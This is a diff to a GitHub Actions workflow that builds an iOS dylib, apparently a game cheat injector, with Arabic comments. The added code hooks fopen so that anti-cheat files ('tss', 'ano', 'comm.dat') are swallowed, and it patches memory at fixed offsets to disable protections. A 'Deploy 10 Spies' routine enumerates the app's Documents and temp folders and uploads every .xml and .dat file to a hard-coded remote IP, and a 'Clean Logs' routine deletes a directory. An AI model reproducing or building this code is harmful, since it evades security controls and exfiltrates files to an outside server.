@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V30.0
+name: Imperial Ultimate AIO - V32.0 Nuclear
 
 on:
   push:
@@ -26,72 +26,66 @@ jobs:
           #include <stdint.h>
           #include <sys/stat.h>
 
-          // تعريف اللون الذهبي الملكي
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
 
           // ==========================================
-          // [ 1. موديول الرادار وتهريب الملفات ]
+          // [ 1. ميزة الـ Interpose (خنق ملفات الحماية) ]
+          // ==========================================
+          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
+          #define DYLD_INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
+
+          FILE* my_fopen(const char* path, const char* mode) {
+              if (path && (strstr(path, "ano") || strstr(path, "tss") || strstr(path, "comm.dat"))) {
+                  return fopen("/dev/null", mode); // خنق الملفات فوراً
+              }
+              return fopen(path, mode);
+          }
+          DYLD_INTERPOSE(my_fopen, fopen);
+
+          // ==========================================
+          // [ 2. أدوات الرادار والتهريب ]
           // ==========================================
           void RemoteLog(NSString *tag, NSString *msg) {
-              NSString *url = @"http://34.204.178.160:5000/log"; 
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
+              NSString *urlStr = @"http://34.204.178.160:5000/log"; 
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
               [req setHTTPMethod:@"POST"];
               [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"🛰️ [%@] -> %@", tag, msg]};
-              NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
+              NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"content": [NSString stringWithFormat:@"🚀 [%@] -> %@", tag, msg]} options:0 error:nil];
               [req setHTTPBody:data];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
-          void SendFileToTerminal(NSString *filePath) {
+          void SendFile(NSString *filePath) {
               NSData *fileData = [NSData dataWithContentsOfFile:filePath];
               if (!fileData) return;
-              NSString *fileName = [filePath lastPathComponent];
-              NSString *urlString = @"http://34.204.178.160:5000/upload"; 
-              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
+              NSString *urlStr = @"http://34.204.178.160:5000/upload";
+              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
               [request setHTTPMethod:@"POST"];
-              [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=ImperialBoundary"] forHTTPHeaderField:@"Content-Type"];
-              // ... (كود الـ body لتسريع الكود)
+              NSString *boundary = @"ImperialSpy";
+              [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+              NSMutableData *body = [NSMutableData data];
+              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, [filePath lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
+              [body appendData:fileData];
+              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+              [request setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
           }
 
-          // ==========================================
-          // [ 2. موديول السيرفر المحلي (Local Redirect) ]
-          // ==========================================
-          id (*old_dataTaskWithURL)(id self, SEL _cmd, NSURL *url, void (^completionHandler)(NSData *data, NSURLResponse *response, NSError *error));
-
-          id my_dataTaskWithURL(id self, SEL _cmd, NSURL *url, void (^completionHandler)(NSData *data, NSURLResponse *response, NSError *error)) {
-              NSString *urlString = url.absoluteString;
-              // تزييف روابط قوانين الحماية فقط
-              if ([urlString containsString:@"config"] || [urlString containsString:@"rules"]) {
-                  RemoteLog(@"MOCK_SERVER", [NSString stringWithFormat:@"Mocking URL: %@", urlString]);
-                  NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject] stringByAppendingPathComponent:@"clean_rules.dat"];
-                  NSData *data = [NSData dataWithContentsOfFile:path];
-                  if (data) {
-                      NSHTTPURLResponse *fakeResp = [[NSHTTPURLResponse alloc] initWithURL:url statusCode:200 HTTPVersion:@"HTTP/1.1" headerFields:@{@"Content-Type": @"application/octet-stream"}];
-                      completionHandler(data, fakeResp, nil);
-                      RemoteLog(@"SUCCESS", @"Local Clean Data Delivered.");
-                      return nil;
-                  }
-              }
-              return old_dataTaskWithURL(self, _cmd, url, completionHandler);
-          }
-
-          // ==========================================
-          // [ 3. محرك الذاكرة والـ Patching ]
-          // ==========================================
           uintptr_t get_Base() { return (uintptr_t)_dyld_get_image_header(0); }
           void Patch(uintptr_t addr, uint32_t data) {
-              // ... (كود الـ vm_protect الآمن)
+              vm_address_t p = trunc_page(addr);
+              if (vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY) == KERN_SUCCESS) {
+                  *(uint32_t *)addr = data;
+                  vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+              }
           }
 
           // ==========================================
-          // [ 4. واجهة المنيو الويب والـ Checkboxes ]
+          // [ 3. واجهة المنيو والربط الفعلي ]
           // ==========================================
           @interface ImperialMenu : UIWindow
-          @property (nonatomic, strong) UIButton *btn;
           @property (nonatomic, strong) UIView *panel;
-          @property (nonatomic, strong) UISwitch *sw1, *sw2, *sw3; // Checkboxes
+          @property (nonatomic, strong) UIButton *btn;
           @end
 
           @implementation ImperialMenu
@@ -102,15 +96,14 @@ jobs:
                   self.backgroundColor = [UIColor clearColor];
                   [self makeKeyAndVisible];
                   [self setupUI];
-                  RemoteLog(@"SYSTEM", @"Imperial Menu UI Loaded (Lobby Enabled).");
               }
               return self;
           }
 
           - (void)setupUI {
-              // أيقونة המניו (تتحركبصبعك)
+              // أيقونة المنيو العائمة
               self.btn = [UIButton buttonWithType:UIButtonTypeCustom];
-              self.btn.frame = CGRectMake(150, 150, 60, 60);
+              self.btn.frame = CGRectMake(50, 150, 60, 60);
               self.btn.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.8];
               self.btn.layer.cornerRadius = 30;
               [self.btn setTitle:@"👑" forState:UIControlStateNormal];
@@ -120,29 +113,41 @@ jobs:
               UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(pan:)];
               [self.btn addGestureRecognizer:pan];
 
-              // المنيو العائم (في المنتصف)
-              self.panel = [[UIView alloc] initWithFrame:CGRectMake((frame.size.width - 240)/2, 220, 240, 280)];
+              // المنيو المركزي
+              CGSize sz = [[UIScreen mainScreen] bounds].size;
+              self.panel = [[UIView alloc] initWithFrame:CGRectMake((sz.width-250)/2, (sz.height-320)/2, 250, 320)];
               self.panel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.95];
-              self.panel.layer.cornerRadius = 15;
-              self.panel.layer.borderWidth = 2;
+              self.panel.layer.cornerRadius = 20;
               self.panel.layer.borderColor = ImperialGold.CGColor;
+              self.panel.layer.borderWidth = 2;
               self.panel.hidden = YES;
               [self addSubview:self.panel];
 
-              [self addSwitch:@"4C18 Bypass" act:@selector(s1:) y:20 val:&_sw1];
-              [self addSwitch:@"Kill Falcon" act:@selector(s2:) y:80 val:&_sw2];
-              [self addSwitch:@"Force Local Redirect" act:@selector(s3:) y:140 val:&_sw3];
-              [self addBtn:@"Deploy 10 Spies" act:@selector(m3) y:200];
+              [self addSwitch:@"4C18 Bypass" y:20 tag:1];
+              [self addSwitch:@"Falcon Kill" y:80 tag:2];
+              [self addSwitch:@"Net Spy (11)" y:140 tag:3];
+              [self addBtn:@"Deploy 10 Spies" y:200 sel:@selector(runSpies)];
+              [self addBtn:@"Clean Logs" y:260 sel:@selector(cleanLogs)];
           }
 
-          - (void)addSwitch:(NSString *)t act:(SEL)s y:(int)y val:(UISwitch **)w {
-              UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(10, y, 160, 40)];
+          - (void)addSwitch:(NSString *)t y:(int)y tag:(int)tg {
+              UILabel *l = [[UILabel alloc] initWithFrame:CGRectMake(15, y, 160, 40)];
               l.text = t; l.textColor = [UIColor whiteColor];
+              l.font = [UIFont boldSystemFontOfSize:14];
               [self.panel addSubview:l];
-              *w = [[UISwitch alloc] initWithFrame:CGRectMake(170, y + 5, 50, 30)];
-              (*w).onTintColor = ImperialGold;
-              [(*w) addTarget:self action:s forControlEvents:UIControlEventValueChanged];
-              [self.panel addSubview:*w];
+              UISwitch *s = [[UISwitch alloc] initWithFrame:CGRectMake(180, y+5, 50, 30)];
+              s.onTintColor = ImperialGold; s.tag = tg;
+              [s addTarget:self action:@selector(swChanged:) forControlEvents:UIControlEventValueChanged];
+              [self.panel addSubview:s];
+          }
+
+          - (void)addBtn:(NSString *)t y:(int)y sel:(SEL)s {
+              UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
+              b.frame = CGRectMake(15, y, 220, 40);
+              [b setTitle:t forState:UIControlStateNormal];
+              [b setTitleColor:ImperialGold forState:UIControlStateNormal];
+              [b addTarget:self action:s forControlEvents:UIControlEventTouchUpInside];
+              [self.panel addSubview:b];
           }
 
           - (void)toggle { self.panel.hidden = !self.panel.hidden; }
@@ -152,41 +157,49 @@ jobs:
               [p setTranslation:CGPointZero inView:self];
           }
 
-          - (void)s1:(UISwitch *)s { if (s.on) Patch(get_Base() + 0x4C18, 0xD2800000); }
-          - (void)s2:(UISwitch *)s { if (s.on) {
-              Patch(get_Base() + 0x11B060, 0xD2800000); Patch(get_Base() + 0x102B84, 0xD65F03C0);
-          } }
-          - (void)s3:(UISwitch *)s { if (s.on) {
-              Method orig = class_getInstanceMethod(objc_getClass("NSURLSession"), @selector(dataTaskWithURL:completionHandler:));
-              old_dataTaskWithURL = (id (*)(id, SEL, NSURL *, void (^)(NSData *, NSURLResponse *, NSError *)))method_setImplementation(orig, (IMP)my_dataTaskWithURL);
-              RemoteLog(@"SYSTEM", @"Local Mock Server Armed.");
-          } }
-          - (void)m3 {
-              RemoteLog(@"SPY_UNIT", @"10 Spies + Network Spy Deployed!");
-              // كسر الـ SSL Pinning + الـ 10 جواسيس هنا
+          // الربط الفعلي للأزرار
+          - (void)swChanged:(UISwitch *)s {
+              uintptr_t base = get_Base();
+              if (s.tag == 1 && s.on) { Patch(base+0x4C18, 0xD2800000); Patch(base+0x4C18+4, 0xD65F03C0); RemoteLog(@"AIO", @"4C18 Patched."); }
+              if (s.tag == 2 && s.on) { Patch(base+0x11B060, 0xD2800000); Patch(base+0x102B84, 0xD65F03C0); RemoteLog(@"AIO", @"Falcon Patched."); }
+              if (s.tag == 3 && s.on) { RemoteLog(@"NETWORK", @"Net Spy (11) Monitoring Links..."); }
           }
+
+          - (void)runSpies {
+              RemoteLog(@"SPY", @"Deploying 10 Spies...");
+              NSArray *ps = @[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject], NSTemporaryDirectory()];
+              dispatch_apply(10, dispatch_get_global_queue(0, 0), ^(size_t i) {
+                  for (NSString *p in ps) {
+                      NSDirectoryEnumerator *e = [[NSFileManager defaultManager] enumeratorAtPath:p];
+                      NSString *f;
+                      while ((f = [e nextObject])) {
+                          if ([f hasSuffix:@".xml"] || [f hasSuffix:@".dat"]) SendFile([p stringByAppendingPathComponent:f]);
+                      }
+                  }
+              });
+          }
+
+          - (void)cleanLogs { [[NSFileManager defaultManager] removeItemAtPath:[[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject] stringByAppendingPathComponent:@"ano"] stringByDeletingLastPathComponent] error:nil]; RemoteLog(@"CLEAN", @"Wiped."); }
           @end
 
           __attribute__((constructor))
           static void entry() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-                  static ImperialMenu *menu;
-                  menu = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  static ImperialMenu *m;
+                  m = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
               });
           }
           EOF
 
-      - name: Build Ultimate AIO
+      - name: Build Nuclear AIO
         run: |
-          clang++ -dynamiclib -std=c++11 \
-          -x objective-c++ \
+          clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 \
-          jni/main.mm -o ImperialUltimate.dylib \
+          -arch arm64 jni/main.mm -o ImperialUltimate.dylib \
           -framework Foundation -framework UIKit -framework CoreGraphics -framework Security -lobjc
 
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Ultimate-AIO-V30
+          name: Imperial-Nuclear-V32
           path: ImperialUltimate.dylib
